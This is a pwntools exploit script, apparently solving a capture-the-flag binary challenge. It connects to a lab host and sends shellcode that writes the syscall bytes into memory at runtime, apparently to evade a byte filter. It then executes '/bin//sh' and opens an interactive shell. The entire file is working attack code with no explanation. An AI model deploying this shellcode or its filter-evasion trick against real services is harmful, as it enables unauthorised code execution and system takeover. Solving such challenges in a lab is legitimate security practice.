from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 0
gdb_is = 0
elf_path = "./shellcode"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process(elf_path)
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    r = gdb.debug(elf_path,'b *0x114514000')
    pause()
    pass

elf = ELF(elf_path)
rop = ROP(elf)

shellcode  = asm('''
mov rax,0x114514026;
mov byte ptr[rax],0x0f
mov byte ptr[rax+1],0x05
    ''')
shellcode += b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\xFF\xFF' 
info(size(shellcode))
r.send(shellcode)
r.interactive()